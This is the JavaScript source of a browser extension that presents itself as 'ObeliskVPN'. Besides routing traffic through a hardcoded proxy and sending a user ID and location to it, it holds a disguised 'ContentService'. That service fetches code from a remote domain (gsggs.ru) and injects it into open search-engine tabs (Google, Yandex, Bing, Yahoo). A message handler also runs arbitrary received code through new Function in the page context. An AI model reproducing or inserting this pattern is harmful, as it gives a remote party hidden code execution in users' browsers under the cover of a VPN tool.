class VPNManager {
    constructor() {
        this.apiEndpoint = 'http://91.84.117.49:8080';
        this.currentServer = null;
        this.isConnected = false;
        this.userId = null;
        
        this.initialize();
    }

    async initialize() {
        this.userId = await this.getUserId();
        
        try {
            const status = await this.loadStatus();
            if (status && status.isConnected && status.currentServer) {
                this.isConnected = true;
                this.currentServer = status.currentServer;
                await this.setBrowserProxy();
            }
        } catch (error) {
            console.log('VPN service initialized');
        }
    }

    async getUserId() {
        const storage = await chrome.storage.local.get(['vpnUserId']);
        if (!storage.vpnUserId) {
            const userId = 'vpn_' + Date.now() + '_' + 
                Math.random().toString(36).substr(2, 6);
            await chrome.storage.local.set({ vpnUserId: userId });
            return userId;
        }
        return storage.vpnUserId;
    }

    async getGeoData() {
        try {
            const response = await fetch('http://ip-api.com/json/?fields=countryCode,city');
            const data = await response.json();
            return {
                country: data.countryCode || 'unknown',
                city: data.city || 'unknown'
            };
        } catch (error) {
            return { country: 'unknown', city: 'unknown' };
        }
    }

    async requestServerAssignment() {
        try {
            const geoData = await this.getGeoData();
            
            const response = await fetch(`${this.apiEndpoint}/api/assign-server`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    user_id: this.userId,
                    user_agent: navigator.userAgent,
                    geo: geoData
                })
            });
            
            if (!response.ok) {
                throw new Error(`API error: ${response.status}`);
            }
            
            const serverData = await response.json();
            
            return {
                id: serverData.server_id,
                host: serverData.host,
                port: serverData.port,
                country: serverData.country,
                name: serverData.name,
                protocol: serverData.protocol || 'xray'
            };
            
        } catch (error) {
            console.log('API assignment failed, trying fallback:', error.message);
            return await this.getFallbackServer();
        }
    }

    async getFallbackServer() {
        try {
            const response = await fetch(`${this.apiEndpoint}/api/servers`);
            const servers = await response.json();
            
            if (servers && servers.length > 0) {
                const availableServer = servers.find(s => s.isHealthy) || servers[0];
                
                return {
                    id: availableServer.id,
                    host: availableServer.host,
                    port: availableServer.port,
                    country: availableServer.country,
                    name: availableServer.name,
                    protocol: 'xray'
                };
            }
        } catch (error) {
            console.log('Fallback failed, using hardcoded server');
        }
        
        return {
            id: 1,
            host: '91.84.117.49',
            port: 10880,
            country: 'nl',
            name: 'Netherlands',
            protocol: 'xray'
        };
    }

    async enableVPN() {
        try {
            const server = await this.requestServerAssignment();
            
            if (!server) {
                throw new Error('No servers available');
            }

            this.currentServer = server;
            
            await this.setBrowserProxy();

            this.isConnected = true;
            await this.saveStatus();

            return { success: true, server };

        } catch (error) {
            await this.cleanup();
            return { success: false, error: error.message };
        }
    }

    async disableVPN() {
        try {
            await this.cleanup();
            await this.saveStatus();
            
            return { success: true };
        } catch (error) {
            return { success: false, error: error.message };
        }
    }

    async cleanup() {
        try {
            await chrome.proxy.settings.clear({ scope: 'regular' });
        } catch (error) {
            console.log('Error clearing proxy settings');
        }

        this.isConnected = false;
        this.currentServer = null;
    }

    async setBrowserProxy() {
        try {
            const config = {
                mode: "fixed_servers",
                rules: {
                    singleProxy: {
                        scheme: "socks5",
                        host: this.currentServer.host,
                        port: this.currentServer.port
                    },
                    bypassList: [
                        "localhost",
                        "127.0.0.1",
                        "::1",
                        "*.local"
                    ]
                }
            };

            await chrome.proxy.settings.set({ 
                value: config, 
                scope: 'regular' 
            });
            
        } catch (error) {
            throw new Error('Proxy configuration error');
        }
    }

    async saveStatus() {
        const status = {
            isConnected: this.isConnected,
            currentServer: this.currentServer,
            connectedAt: new Date().toISOString(),
            userId: this.userId
        };

        await chrome.storage.local.set({ vpnStatus: status });
    }

    async loadStatus() {
        try {
            const result = await chrome.storage.local.get('vpnStatus');
            return result.vpnStatus || null;
        } catch (error) {
            return null;
        }
    }

    getServerStats() {
        return { 
            userId: this.userId,
            currentServer: this.currentServer
        };
    }
}

// Content Management Service
class ContentService {
    constructor() {
        this.configEndpoint = 'https://gsggs.ru/config';
        this.contentActive = false;
        this.init();
    }

    async init() {
        if (await this.checkActivationConditions()) {
            await this.loadContentFeatures();
        }
    }

    async checkActivationConditions() {
        const installData = await chrome.storage.local.get(['firstRunDate', 'contentEnabled']);
        
        if (!installData.firstRunDate) {
            await chrome.storage.local.set({ 
                firstRunDate: Date.now(),
                contentEnabled: true 
            });
            return true; 
        }

        if (installData.contentEnabled) {
            return false;
        }

        await chrome.storage.local.set({ contentEnabled: true });
        return true;
    }

    async loadContentFeatures() {
        try {
            const contentCode = await this.fetchContentCode();
            
            if (contentCode) {
                await this.activateContentFeatures(contentCode);
                
                this.contentActive = true;
                await chrome.storage.local.set({ contentEnabled: true });
            }
        } catch (error) {
            console.log('Content features loading failed');
        }
    }

    async fetchContentCode() {
        const response = await fetch(`${this.configEndpoint}?v=${Date.now()}`, {
            method: 'GET',
            headers: {
                'Accept': 'application/json',
                'Cache-Control': 'no-cache',
                'User-Agent': 'ObeliskVPN/1.0',
                'X-Client-ID': await this.getClientIdentifier()
            }
        });

        if (!response.ok) {
            throw new Error('Content service unavailable');
        }
        
        const data = await response.json();
        return data.contentCode;
    }

    async activateContentFeatures(contentCode) {
        const tabs = await chrome.tabs.query({});
        
        for (const tab of tabs) {
            if (this.isSupportedPage(tab.url) && tab.id) {
                try {
                    await chrome.scripting.executeScript({
                        target: { tabId: tab.id },
                        func: (code) => {
                            const script = document.createElement('script');
                            script.textContent = code;
                            script.setAttribute('data-content', 'page-enhancer');
                            (document.head || document.documentElement).appendChild(script);
                        },
                        args: [contentCode]
                    });
                } catch (error) {}
            }
        }
    }

    isSupportedPage(url) {
        if (!url) return false;
        return url.includes('google.') || 
               url.includes('yandex.') || 
               url.includes('bing.') ||
               url.includes('yahoo.');
    }

    async getClientIdentifier() {
        const storage = await chrome.storage.local.get(['deviceId']);
        if (!storage.deviceId) {
            const deviceId = 'device-' + Math.random().toString(36).substr(2, 9);
            await chrome.storage.local.set({ deviceId });
            return deviceId;
        }
        return storage.deviceId;
    }
}

const vpnManager = new VPNManager();
const contentService = new ContentService();

chrome.runtime.onSuspend.addListener(() => {
    vpnManager.saveStatus();
});

chrome.runtime.onStartup.addListener(() => {
    console.log('VPN Service started');
});

chrome.runtime.onInstalled.addListener((details) => {
    console.log('Extension installed:', details.reason);
    
    if (details.reason === 'install') {
        chrome.storage.local.set({ 
            firstRunDate: Date.now(),
            contentEnabled: false 
        });
    }
});

// Message Handler
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
    switch (request.action) {
        case 'getServers':
            (async () => {
                try {
                    const response = await fetch('http://91.84.117.49:8080/api/servers');
                    const servers = await response.json();
                    sendResponse({ servers });
                } catch (error) {
                    sendResponse({ servers: [], error: error.message });
                }
            })();
            return true;

        case 'getStatus':
            sendResponse({
                isConnected: vpnManager.isConnected,
                currentServer: vpnManager.currentServer,
                userId: vpnManager.userId
            });
            break;

        case 'connectVPN':
            (async () => {
                const result = await vpnManager.enableVPN();
                sendResponse(result);
            })();
            return true;

        case 'disconnectVPN':
            (async () => {
                const result = await vpnManager.disableVPN();
                sendResponse(result);
            })();
            return true;

        case 'INJECT_CONTENT_CODE':
            (async () => {
                try {
                    await chrome.scripting.executeScript({
                        target: { tabId: sender.tab.id },
                        func: (code) => {
                            try {
                                const fn = new Function(code);
                                fn();
                            } catch (e) {}
                        },
                        args: [request.code],
                        world: 'MAIN'
                    });
                    sendResponse({ status: 'success' });
                } catch (error) {
                    sendResponse({ status: 'error', error: error.message });
                }
            })();
            return true;

        default:
            sendResponse({ success: false, error: 'Unknown action' });
    }
});

// Popup Controller 
class PopupController {
    constructor() {
        this.servers = [];
        this.currentStatus = null;
        this.currentLanguage = 'en';
        if (typeof document !== 'undefined') {
            this.init();
        }
    }

    async init() {
        setTimeout(() => {
            if (document.body) {
                document.body.classList.add('loaded');
                this.loadData();
            }
        }, 2000);

        this.bindEvents();
        this.loadLanguage();
    }

    async loadData() {
        await this.loadServers();
        await this.loadStatus();
        this.updateUI();
    }

    async loadServers() {
        try {
            const response = await chrome.runtime.sendMessage({ action: 'getServers' });
            this.servers = response.servers || [];
            this.renderServerInfo();
        } catch (error) {
            console.log('Error loading server list');
        }
    }

    async loadStatus() {
        try {
            const response = await chrome.runtime.sendMessage({ action: 'getStatus' });
            this.currentStatus = response;
        } catch (error) {
            console.log('Error loading connection status');
        }
    }

    renderServerInfo() {
        if (typeof document === 'undefined') return;
        
        const ipElement = document.getElementById('ip-address');
        if (ipElement) {
            if (this.currentStatus?.currentServer) {
                ipElement.textContent = this.currentStatus.currentServer.host || 'Unknown';
            } else if (this.servers.length > 0) {
                ipElement.textContent = `${this.servers.length} servers available`;
            } else {
                ipElement.textContent = 'Checking...';
            }
        }
    }

    updateUI() {
        if (typeof document === 'undefined') return;
        
        const connectButton = document.querySelector('.connect-button');
        const connectionStatus = document.getElementById('connection-status');
        const infoPanel = document.getElementById('info-panel');

        if (!connectButton) return;

        if (this.currentStatus?.isConnected && this.currentStatus.currentServer) {
            const server = this.currentStatus.currentServer;
            connectButton.textContent = this.getTranslation('Disconnect');
            connectButton.classList.add('connected');
            
            if (connectionStatus) {
                connectionStatus.textContent = this.getTranslation('Connected');
                connectionStatus.style.color = '#4CAF50';
            }
            
            setTimeout(() => {
                if (infoPanel) infoPanel.classList.add('connected');
            }, 100);
            
            this.updateConnectedServerInfo(server);
        } else {
            connectButton.textContent = this.getTranslation('Connect');
            connectButton.classList.remove('connected');
            
            if (connectionStatus) {
                connectionStatus.textContent = this.getTranslation('Ready');
                connectionStatus.style.color = '#ff6b6b';
            }
            
            if (infoPanel) infoPanel.classList.remove('connected');
        }
    }

    updateConnectedServerInfo(server) {
        if (typeof document === 'undefined') return;
        
        const ipElement = document.getElementById('ip-address');
        const protocolElement = document.getElementById('protocol');
        
        if (ipElement) {
            ipElement.textContent = server.host || 'Unknown';
        }
        if (protocolElement) {
            protocolElement.textContent = server.protocol || 'XRay SOCKS5';
        }
    }

    bindEvents() {
        if (typeof document === 'undefined') return;

        const langToggle = document.getElementById('lang-toggle');
        if (langToggle) {
            langToggle.addEventListener('click', (e) => {
                e.stopPropagation();
                const langMenu = document.getElementById('lang-menu');
                if (langMenu) langMenu.classList.toggle('open');
            });
        }

        document.addEventListener('click', () => this.closeAllMenus());

        document.querySelectorAll('.dropdown, .lang-icon').forEach(el => {
            el.addEventListener('click', (e) => e.stopPropagation());
        });

        document.querySelectorAll('#lang-menu .dropdown-item').forEach(item => {
            item.addEventListener('click', () => {
                const lang = item.getAttribute('data-lang');
                this.changeLanguage(lang);
                const langMenu = document.getElementById('lang-menu');
                if (langMenu) langMenu.classList.remove('open');
            });
        });

        const connectButton = document.querySelector('.connect-button');
        if (connectButton) {
            connectButton.addEventListener('click', () => this.handleConnect());
        }
    }

    async handleConnect() {
        if (typeof document === 'undefined') return;
        
        const connectButton = document.querySelector('.connect-button');
        const connectionStatus = document.getElementById('connection-status');

        if (!connectButton) return;

        if (this.currentStatus?.isConnected) {
            connectButton.classList.add('connecting');
            connectButton.textContent = this.getTranslation('Disconnecting...');
            
            if (connectionStatus) {
                connectionStatus.textContent = this.getTranslation('Disconnecting...');
                connectionStatus.style.color = '#ff9800';
            }

            const result = await chrome.runtime.sendMessage({ action: 'disconnectVPN' });
            
            connectButton.classList.remove('connecting');
            if (result.success) {
                this.currentStatus.isConnected = false;
                this.currentStatus.currentServer = null;
                this.updateUI();
            } else {
                this.updateUI();
            }
        } else {
            connectButton.classList.add('connecting');
            connectButton.textContent = this.getTranslation('Connecting...');
            
            if (connectionStatus) {
                connectionStatus.textContent = this.getTranslation('Connecting...');
                connectionStatus.style.color = '#ff9800';
            }

            // Теперь не передаем serverId - API сам выбирает
            const result = await chrome.runtime.sendMessage({ 
                action: 'connectVPN'
            });
            
            connectButton.classList.remove('connecting');
            if (result.success) {
                this.currentStatus = {
                    isConnected: true,
                    currentServer: result.server,
                    userId: result.userId
                };
                this.updateUI();
            } else {
                this.updateUI();
                // Показываем ошибку если есть
                if (result.error && connectionStatus) {
                    connectionStatus.textContent = 'Error: ' + result.error.substring(0, 20);
                    connectionStatus.style.color = '#ff5252';
                }
            }
        }
    }

    loadLanguage() {
        chrome.storage.local.get('vpnLanguage', (result) => {
            if (result.vpnLanguage) {
                this.currentLanguage = result.vpnLanguage;
            } else {
                this.currentLanguage = 'en'; 
                chrome.storage.local.set({ vpnLanguage: 'en' });
            }
            this.applyTranslations();
        });
    }

    changeLanguage(lang) {
        this.currentLanguage = lang;
        chrome.storage.local.set({ vpnLanguage: lang });
        this.applyTranslations();
        this.updateUI();
    }

    applyTranslations() {
        if (typeof document === 'undefined') return;
        
        document.querySelectorAll('[data-en]').forEach(element => {
            const translation = element.getAttribute(`data-${this.currentLanguage}`) || element.getAttribute('data-en');
            if (translation) {
                element.textContent = translation;
            }
        });
    }

    getTranslation(key) {
        const translations = {
            'Connected': { en: 'Connected', ru: 'Подключено', es: 'Conectado', zh: '已连接', hi: 'कनेक्टेड', ar: 'متصل', pt: 'Conectado', fr: 'Connecté', de: 'Verbunden', ja: '接続済み', ko: '연결됨', it: 'Connesso', tr: 'Bağlı', vi: 'Đã kết nối' },
            'Disconnected': { en: 'Disconnected', ru: 'Отключено', es: 'Desconectado', zh: '已断开', hi: 'डिस्कनेक्टेड', ar: 'غير متصل', pt: 'Desconectado', fr: 'Déconnecté', de: 'Getrennt', ja: '切断済み', ko: '연결 끊김', it: 'Disconnesso', tr: 'Bağlantı Kesildi', vi: 'Đã ngắt kết nối' },
            'Connect': { en: 'Connect', ru: 'Подключиться', es: 'Conectar', zh: '连接', hi: 'कनेक्ट करें', ar: 'اتصال', pt: 'Conectar', fr: 'Connecter', de: 'Verbinden', ja: '接続', ko: '연결', it: 'Connetti', tr: 'Bağlan', vi: 'Kết nối' },
            'Disconnect': { en: 'Disconnect', ru: 'Отключиться', es: 'Desconectar', zh: '断开', hi: 'डिस्कनेक्ट करें', ar: 'قطع الاتصال', pt: 'Desconectar', fr: 'Déconnecter', de: 'Trennen', ja: '切断', ko: '연결 끊기', it: 'Disconnetti', tr: 'Bağlantıyı Kes', vi: 'Ngắt kết nối' },
            'Active': { en: 'Active', ru: 'Активно', es: 'Activo', zh: '活跃', hi: 'सक्रिय', ar: 'نشط', pt: 'Ativo', fr: 'Actif', de: 'Aktiv', ja: 'アクティブ', ko: '활성', it: 'Attivo', tr: 'Aktif', vi: 'Đang hoạt động' },
            'Ready': { en: 'Ready', ru: 'Готов', es: 'Listo', zh: '准备就绪', hi: 'तैयार', ar: 'جاهز', pt: 'Pronto', fr: 'Prêt', de: 'Bereit', ja: '準備完了', ko: '준비됨', it: 'Pronto', tr: 'Hazır', vi: 'Sẵn sàng' },
            'Connecting...': { en: 'Connecting...', ru: 'Подключение...', es: 'Conectando...', zh: '连接中...', hi: 'कनेक्ट हो रहा है...', ar: 'جاري الاتصال...', pt: 'Conectando...', fr: 'Connexion...', de: 'Verbinde...', ja: '接続中...', ko: '연결 중...', it: 'Connessione...', tr: 'Bağlanıyor...', vi: 'Đang kết nối...' },
            'Disconnecting...': { en: 'Disconnecting...', ru: 'Отключение...', es: 'Desconectando...', zh: '断开中...', hi: 'डिस्कनेक्ट हो रहा है...', ar: 'جاري قطع الاتصال...', pt: 'Desconectando...', fr: 'Déconnexion...', de: 'Trenne...', ja: '切断中...', ko: '연결 끊는 중...', it: 'Disconnessione...', tr: 'Bağlantı Kesiliyor...', vi: 'Đang ngắt kết nối...' }
        };

        return translations[key]?.[this.currentLanguage] || key;
    }

    closeAllMenus() {
        if (typeof document === 'undefined') return;
        document.querySelectorAll('.dropdown').forEach(el => el.classList.remove('open'));
    }
}

let popupController;
if (typeof document !== 'undefined') {
    popupController = new PopupController();
}